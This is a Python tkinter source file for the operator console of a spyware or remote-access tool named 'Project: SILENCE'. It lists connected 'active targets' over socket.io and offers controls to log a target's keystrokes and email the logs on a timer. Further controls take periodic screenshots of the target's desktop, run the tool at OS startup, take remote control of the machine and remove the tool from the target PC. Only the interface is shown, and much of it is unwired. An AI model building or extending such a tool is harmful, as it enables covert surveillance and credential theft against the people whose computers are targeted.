#
# ......................................................................................................................
from tkinter import *
from tkinter import ttk
import silent


def authorization_screen(sio):

    global socket_io
    socket_io = sio

    # globalise username & password entries by user.
    global window
    global entry_password
    global entry_username
    global lbl_fail

    # initiate authorisation window.
    window = Tk()
    window.title("Project: SILENCE")
    window.geometry("330x150")
    window.resizable(0, 0)

    # set window on center screen.
    window.update_idletasks()
    width = window.winfo_width()
    height = window.winfo_height()
    x = (window.winfo_screenwidth() // 2) - (width // 2)
    y = (window.winfo_screenheight() // 2) - (height // 2)
    window.geometry('{}x{}+{}+{}'.format(width, height, x, y))

    # create label instances.
    lbl_username = Label(window, text="Username")
    lbl_password = Label(window, text="Password")

    # create username input instance.
    entry_username = Entry(window)

    # bind an 'enter' key to also check user input details.
    window.bind("<Return>", silent.user_check)

    # automatically focus on username input to simplify writing.
    entry_username.focus()

    # create password input instance.
    entry_password = Entry(window, show='*')

    # deploy all instances
    lbl_username.pack(pady=[5, 0])
    entry_username.pack()
    lbl_password.pack()
    entry_password.pack()

    # create button instance and call back function to check account details.
    btn_login = Button(window, text="Log In", font='bold', width=13, command=silent.user_check)

    # if wrong username or password is written, create the information label of instance and deploy it.
    lbl_fail = Label(window)
    lbl_fail.pack()

    # deploy button instance.
    btn_login.pack()

    # execute authorisation screen.
    window.mainloop()


# ......................................................................................................................
def main_screen():
    print('Welcome User !')

    # initiate main window.
    frame = Tk()
    frame.title("Project : SILENCE")
    frame.geometry("650x350")
    frame.resizable(0, 0)

    # set main window on center screen.
    frame.update_idletasks()
    width = frame.winfo_width()
    height = frame.winfo_height()
    x = (frame.winfo_screenwidth() // 2) - (width // 2)
    y = (frame.winfo_screenheight() // 2) - (height // 2)
    frame.geometry('{}x{}+{}+{}'.format(width, height, x, y))

    tab_control = ttk.Notebook(frame)

    # set default title font.
    font_frame = ('Helvetica', 10, 'bold')

    # set default value font.
    font_set = ('Helvetica', 8)

    # ..................................................................................................................
    def target_list():
        # Field set to display the active target options.
        target_frame = LabelFrame(frame, height=100, font=('Helvetica', 9, 'bold'), text='ACTIVE TARGETS')
        target_frame.pack(side=TOP, fill='x', padx=[5, 0])

        # A label to display the current connection status of a target.
        lbl_connection_status = Label(target_frame, fg='red', font=('Helvetica', 9), text='Status: offline')

        lbl_connection_status.pack(anchor='w', padx=5, pady=5)

        # A frame to list the current active targets.
        fr = Frame(target_frame)
        fr.pack()

        # A listbox which will list of all currently active targets.
        list_targets = Listbox(fr, width=25, height=17, font=("Helvetica", 8))
        list_targets.pack(side="left", fill='y', pady=6)

        # focus on target connection list to simplify connection usage.
        list_targets.focus()

        # scroll bar for the listbox.
        scrollbar = Scrollbar(fr, orient="vertical")
        scrollbar.config(command=list_targets.yview)
        scrollbar.pack(side="right", fill="y")

        list_targets.config(yscrollcommand=scrollbar.set)

        socket_io.emit('get client_list')

        @socket_io.on('list client')
        def list_client(users):

            global clients
            clients = users

            list_targets.delete(0, END)

            global client

            for client in clients:
                list_targets.insert(END, client['name'])
                list_targets.selection_set(0)

            socket_io.emit('get client_list')

        def select_client():
            print('click')

            global selected_client
            selected_client = list_targets.get(ACTIVE)

            socket_io.emit('get client_data', selected_client)

        btn_connect_to_target = Button(target_frame, font=font_frame, text='CONNECT', command=select_client)
        btn_connect_to_target.pack(side=BOTTOM, padx=5, pady=5, fill='x')

        @socket_io.on('client data')
        def client_data(data):

            global client_data
            client_data = data

            print(str(client_data))

            for clients_data in client_data:
                if clients_data['name'] == client['name']:
                    btn_connect_to_target.config(text='DISCONNECT')
                    enable_tabs()
                else:
                    btn_connect_to_target.config(text='CONNECT')
                    messagebox.showwarning('Connection Error:', 'cannot establish connection.')
                    disable_tabs()

    # ..................................................................................................................
    def tab_log():
        print('')

        # ..............................................................................................................
        def module_logging():

            global tab_logging

            # create and position a logging tab.
            tab_logging = ttk.Frame(tab_control)
            tab_control.add(tab_logging, text='   Logging   ')
            tab_control.pack(expand=TRUE, side='right', padx=8, pady=5, fill='both')

            # add and position an field set to provide options for logging.
            options_frame = LabelFrame(tab_logging, font=font_frame, text='Options')
            options_frame.pack(fill='x', padx=4, pady=2)

            row1_opt = PanedWindow(options_frame)
            row1_opt.pack(side=TOP, fill='x')

            # create and position a label to specify if the program should run automatically.
            lbl_options_automatic_start = Label(row1_opt, font=font_set,
                                                text='Automatically run program on OS startup:')
            lbl_options_automatic_start.pack(padx=5, pady=5, side=LEFT)

            # create a check box to set the program to run automatically when operating system starts up.
            chck_automatic_start = Checkbutton(row1_opt, font=font_set, text='on/off')
            chck_automatic_start.pack(padx=41, pady=1, side=RIGHT)

            row2_opt = PanedWindow(options_frame)
            row2_opt.pack(side=TOP, fill='x')

            # create and position a label to specify an email address entry.
            lbl_options_email = Label(row2_opt, font=font_set, text='Send the logs to email address: ')
            lbl_options_email.pack(side=LEFT, padx=5, pady=1)

            # create and position an Entry to set a default email to send the logs.
            entry_email = Entry(row2_opt, font=font_set, width=30)
            entry_email.pack(side=LEFT)

            chck_default_email = Checkbutton(row2_opt, font=font_set, text='Set default')
            chck_default_email.pack(side=LEFT)

            row3_opt = PanedWindow(options_frame)
            row3_opt.pack(side=TOP, fill='x')

            # create a label to specify if the program should be removed.
            lbl_options_remove = Label(row3_opt, font=font_set, text="Remove 'Project: Silence' from target PC:")
            lbl_options_remove.pack(side=LEFT, padx=5, pady=1)

            # create a button to allow to remove the program from targets computer.
            btn_options_remove = Button(row3_opt, text='Remove', font=('Helvetica', 8))
            btn_options_remove.pack(side=RIGHT, padx=15, pady=5)

        # run the function.
        module_logging()

        # ..............................................................................................................
        def module_keystroke():
            # add an field set to provide key logging options for a program.
            keystrokes_frame = LabelFrame(tab_logging, font=font_frame, text='Keystrokes')
            keystrokes_frame.pack(fill='x', padx=4, pady=2)

            row2_keystroke = PanedWindow(keystrokes_frame)
            row2_keystroke.pack(side=BOTTOM, fill='x')

            # add a slider to set the default time value of when the key stroking log should be sent.
            scale_keystroke = Scale(row2_keystroke, font=font_set, orient='horizontal', from_=0, to=120, length=320,
                                    tickinterval=10)
            scale_keystroke.pack(side=LEFT, padx=[25, 9])

            # add a button to control to turn on or off key stroke feature on targets computer.
            bttn_start_keystroke = Button(row2_keystroke, font=font_set, text='Turn on')
            bttn_start_keystroke.pack(side=LEFT)

            row1_keystroke = PanedWindow(keystrokes_frame)
            row1_keystroke.pack(side=BOTTOM, fill='x')

            # add a label to tell how much minutes an user has set to sent the logs through an email.
            lbl_keystroke_info = Label(row1_keystroke, font=font_set,
                                       text='Send an keystroke log every ')
            lbl_keystroke_info.pack(side=LEFT, padx=5, pady=1)

        # run the function.
        module_keystroke()

        # ..............................................................................................................
        def module_screenshot():
            # add an field set to provide screen shot options for a program.
            screenshot_frame = LabelFrame(tab_logging, font=font_frame, text='Screenshots')
            screenshot_frame.pack(fill='x', padx=4, pady=2)

            row2_screenshots = PanedWindow(screenshot_frame)
            row2_screenshots.pack(side=BOTTOM, fill='x')

            # add a slider to set the default time value of when the screen shots should be sent.
            scale_screenshot = Scale(row2_screenshots, font=font_set, orient='horizontal', from_=0, to=120, length=320,
                                     tickinterval=10)
            scale_screenshot.pack(side=LEFT, padx=[25, 9])

            # add a button to control to turn on or off screen shot feature on targets computer.
            bttn_start_screenshot = Button(row2_screenshots, font=font_set, text='Turn on')
            bttn_start_screenshot.pack(side=LEFT)

            row1_screenshots = PanedWindow(screenshot_frame)
            row1_screenshots.pack(side=BOTTOM, fill='x')

            # add a slider to set the default time value of when the screen shots shoud be sent.
            lbl_screenshot_info = Label(row1_screenshots, font=font_set, text='Send targets desktop screenshots every ')
            lbl_screenshot_info.pack(side=LEFT, padx=5, pady=1)

        # run the function.
        module_screenshot()

    # run the function.
    tab_log()

    # ..................................................................................................................
    def tab_remote_control():

        global remote_control
        global options_frame

        # create and position a remote control tab.
        remote_control = ttk.Frame(tab_control)
        tab_control.add(remote_control, text="   Remote Control   ")
        tab_control.pack()

        # add an field set to provide remote control options for a program.
        options_frame = LabelFrame(remote_control, height=5, font=font_frame, text='Options')
        options_frame.pack(fill='x', padx=4)

        # ..............................................................................................................
        def module_remote_control():
            # add and position a label to specify the remote control status.
            lbl_start_remote = Label(options_frame, padx=2, font=font_set, text='Remote control: ')
            lbl_start_remote.pack(side=LEFT, padx=[5, 0])

            # add a button to launch the remote control feature on or off.
            btn_start_remote = Button(options_frame, font=font_set, text='Turn on')
            btn_start_remote.pack(side=LEFT)

        # run the function.
        module_remote_control()

        # ..............................................................................................................
        def module_remote_display():
            # add and position a label which indicates if the full screen mode is on or off.
            lbl_remote_control = Label(options_frame, padx=2, pady=10, font=font_set, text='Full screen mode: ')
            lbl_remote_control.pack(side=LEFT, padx=[120, 0])

            # create a button to go full screen.
            btn_full_screen = Button(options_frame, font=font_set, text='Turn on')
            btn_full_screen.pack(side=LEFT)

            # add an field set to provide remote control options for a program.
            display_frame = LabelFrame(remote_control, height=250, font=font_frame, text='Display')
            display_frame.pack(fill='both', padx=4, pady=3)

        module_remote_display()

    # run the function.
    tab_remote_control()

    # ..................................................................................................................
    def tab_extra_feature():
        tab_extra = ttk.Frame(tab_control)
        tab_control.add(tab_extra, text="   Extra Feature   ")
        tab_control.pack()

    tab_extra_feature()

    # ..................................................................................................................
    def tab_about_project():
        tab_about = ttk.Frame(tab_control)
        tab_control.add(tab_about, text="    About    ")
        tab_control.pack()

    tab_about_project()

    # ..................................................................................................................
    def disable_tabs():
        for i in range(3):
            tab_control.tab(i, state="disabled")

    disable_tabs()

    def enable_tabs():
        for i in range(3):
            tab_control.tab(i, state="normal")
            tab_control.select(tab_logging)
    # ..................................................................................................................
    target_list()
    # execute main screen.
    frame.mainloop()

